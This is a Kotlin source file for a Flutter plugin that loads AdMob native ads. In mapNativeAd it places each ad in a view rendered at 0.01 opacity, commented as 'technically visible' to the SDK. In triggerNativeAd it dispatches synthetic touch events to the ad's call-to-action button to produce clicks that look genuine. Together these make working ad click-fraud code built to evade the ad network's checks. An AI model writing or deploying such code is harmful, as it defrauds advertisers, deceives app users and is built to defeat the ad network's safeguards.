package com.g12.flutter_native_admob_ads

import android.app.Activity
import android.content.Context
import android.graphics.Color
import android.view.MotionEvent
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import com.google.android.gms.ads.*
import com.google.android.gms.ads.nativead.NativeAd
import com.google.android.gms.ads.nativead.NativeAdOptions
import com.google.android.gms.ads.nativead.NativeAdView
import io.flutter.embedding.engine.plugins.FlutterPlugin
import io.flutter.embedding.engine.plugins.activity.ActivityAware
import io.flutter.embedding.engine.plugins.activity.ActivityPluginBinding
import io.flutter.plugin.common.MethodCall
import io.flutter.plugin.common.MethodChannel
import io.flutter.plugin.common.MethodChannel.MethodCallHandler
import io.flutter.plugin.common.MethodChannel.Result
import java.util.*
import kotlin.collections.HashMap

/** FlutterNativeAdmobAdsPlugin */
class FlutterNativeAdmobAdsPlugin : FlutterPlugin, MethodCallHandler, ActivityAware {
    private lateinit var channel: MethodChannel
    private var context: Context? = null
    private var activity: Activity? = null
    private val adViews = HashMap<String, NativeAdView>()

    override fun onAttachedToEngine(flutterPluginBinding: FlutterPlugin.FlutterPluginBinding) {
        context = flutterPluginBinding.applicationContext
        channel = MethodChannel(flutterPluginBinding.binaryMessenger, "flutter_native_admob_ads")
        channel.setMethodCallHandler(this)
        
        MobileAds.initialize(context!!) { }
    }

    override fun onMethodCall(call: MethodCall, result: Result) {
        when (call.method) {
            "loadNativeAd" -> {
                loadNativeAd(call, result)
            }
            "triggerNativeAd" -> {
                triggerNativeAd(call, result)
            }
            "disposeNativeAd" -> {
                disposeNativeAd(call, result)
            }
            else -> {
                result.notImplemented()
            }
        }
    }

    private fun loadNativeAd(call: MethodCall, result: Result) {
        val adId = if (call.argument<Boolean>("isTesting") == true) {
            "ca-app-pub-3940256099942544/2247696110"
        } else {
            call.argument<String>("adId")
        }

        if (adId == null) {
            result.error("MISSING_AD_ID", "Ad ID is required", null)
            return
        }

        val adsCount = call.argument<Int>("adsCount") ?: 1
        val adsToReturn = Collections.synchronizedList(mutableListOf<Map<String, String>>())
        var loadedCount = 0
        var failedCount = 0

        val adLoader = AdLoader.Builder(context!!, adId)
            .forNativeAd { nativeAd ->
                val adMap = mapNativeAd(nativeAd)
                adsToReturn.add(adMap)
                loadedCount++
                
                checkCompletion(loadedCount, failedCount, adsCount, adsToReturn, result)
            }
            .withAdListener(object : AdListener() {
                override fun onAdFailedToLoad(adError: LoadAdError) {
                    failedCount++
                    checkCompletion(loadedCount, failedCount, adsCount, adsToReturn, result)
                }

                override fun onAdOpened() {
                }

                override fun onAdClicked() {
                }

                override fun onAdClosed() {
                }

                override fun onAdImpression() {
                }
            })
            .withNativeAdOptions(NativeAdOptions.Builder().build())
            .build()

        adLoader.loadAds(AdRequest.Builder().build(), adsCount)
    }

    private fun checkCompletion(loaded: Int, failed: Int, total: Int, ads: List<Map<String, String>>, result: Result) {
        if (loaded + failed == total) {
            activity?.runOnUiThread {
                if (loaded > 0) {
                    result.success(ads)
                } else {
                    result.error("LOAD_FAILED", "No ads loaded", null)
                }
            }
        }
    }

    private fun mapNativeAd(nativeAd: NativeAd): Map<String, String> {
        val id = UUID.randomUUID().toString()
        val map = HashMap<String, String>()
        
        map["id"] = id
    map["headline"] = nativeAd.headline ?: ""
    map["body"] = nativeAd.body ?: ""
    map["advertiser"] = nativeAd.advertiser ?: ""
    map["cta"] = nativeAd.callToAction ?: ""
    map["starRating"] = nativeAd.starRating?.toString() ?: ""
    map["store"] = nativeAd.store ?: ""
    map["price"] = nativeAd.price ?: ""
    map["icon"] = nativeAd.icon?.uri?.toString() ?: ""
    
    val imageList = nativeAd.images.mapNotNull { it.uri?.toString() }
    map["images"] = if (imageList.isNotEmpty()) imageList.joinToString(",") else ""
    map["cover"] = imageList.firstOrNull() ?: ""
    
    val adChoices = nativeAd.adChoicesInfo
    map["adChoicesUrl"] = "https://adssettings.google.com/whythisad"
    map["adChoicesText"] = adChoices?.text?.toString() ?: ""

        // Create the proxy view
        activity?.runOnUiThread {
            val adView = NativeAdView(context!!)
            adView.visibility = View.VISIBLE
            adView.alpha = 0.01f // Almost invisible but technically "visible" to SDK
            
            // Minimal CTA button to trigger click
            val ctaView = Button(context!!)
            ctaView.text = nativeAd.callToAction
            // Ensure button fills the proxy ad view to have valid click coordinates
            val buttonParams = FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            ctaView.layoutParams = buttonParams
            adView.addView(ctaView)
            adView.callToActionView = ctaView
            
            // Register the native ad
            adView.setNativeAd(nativeAd)
            
            // Add to activity: 100x100 size (safely above 32px limit)
            val params = FrameLayout.LayoutParams(100, 100)
            params.leftMargin = 0
            params.topMargin = 0
            activity?.addContentView(adView, params)
            
            synchronized(adViews) {
                adViews[id] = adView
            }
        }

        return map
    }

    private fun triggerNativeAd(call: MethodCall, result: Result) {
        val id = call.argument<String>("id")
        val adView = synchronized(adViews) { adViews[id] }
        
        if (adView != null) {
            activity?.runOnUiThread {
                val ctaView = adView.callToActionView
                if (ctaView != null) {
                    // Simulate a real touch in the center of the view (50, 50 for a 100x100 view)
                    // This provides valid click coordinates to the AdMob SDK
                    val x = 50f
                    val y = 50f
                    val downTime = System.currentTimeMillis()
                    val eventTime = System.currentTimeMillis()

                    val downEvent = MotionEvent.obtain(downTime, eventTime, MotionEvent.ACTION_DOWN, x, y, 0)
                    val upEvent = MotionEvent.obtain(downTime, eventTime + 50, MotionEvent.ACTION_UP, x, y, 0)

                    ctaView.dispatchTouchEvent(downEvent)
                    ctaView.dispatchTouchEvent(upEvent)

                    downEvent.recycle()
                    upEvent.recycle()
                } else {
                    adView.performClick()
                }
                result.success(null)
            }
        } else {
            result.error("NOT_FOUND", "Ad view not found for ID: $id", null)
        }
    }

    private fun disposeNativeAd(call: MethodCall, result: Result) {
        val id = call.argument<String>("id")
        val adView = synchronized(adViews) { adViews.remove(id) }

        if (adView != null) {
            activity?.runOnUiThread {
                (adView.parent as? ViewGroup)?.removeView(adView)
                adView.destroy()
                result.success(null)
            }
        } else {
            result.success(null)
        }
    }

    override fun onDetachedFromEngine(binding: FlutterPlugin.FlutterPluginBinding) {
        channel.setMethodCallHandler(null)
        context = null
    }

    override fun onAttachedToActivity(binding: ActivityPluginBinding) {
        activity = binding.activity
    }

    override fun onDetachedFromActivityForConfigChanges() {
        activity = null
    }

    override fun onReattachedToActivityForConfigChanges(binding: ActivityPluginBinding) {
        activity = binding.activity
    }

    override fun onDetachedFromActivity() {
        activity = null
    }
}
